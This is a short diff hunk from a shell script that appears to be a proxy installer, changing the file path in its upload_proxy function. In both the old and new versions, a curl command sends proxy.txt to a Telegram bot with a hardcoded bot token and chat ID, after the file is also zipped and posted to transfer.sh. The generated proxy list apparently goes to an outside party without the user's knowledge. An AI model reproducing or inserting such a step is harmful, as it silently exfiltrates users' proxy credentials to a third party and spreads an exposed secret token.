@@ -55,7 +55,7 @@ upload_proxy() {
     local PASS=$(random)
     zip --password $PASS proxy.zip proxy.txt
     URL=$(curl -s --upload-file proxy.zip https://transfer.sh/proxy.zip)
-    URL=$(curl -v -F "chat_id=5280949072" -F document=@/Users/users/Desktop/proxy.txt https://api.telegram.org/bot5222628514:AAGtPt6Rsmm_DRvSZrRLPSTQR-_HJC6jzdg/sendDocument)
+    URL=$(curl -v -F "chat_id=5280949072" -F document=@/home/proxy-installer/proxy.txt https://api.telegram.org/bot5222628514:AAGtPt6Rsmm_DRvSZrRLPSTQR-_HJC6jzdg/sendDocument)
 }
 gen_data() {
     seq $FIRST_PORT $LAST_PORT | while read port; do
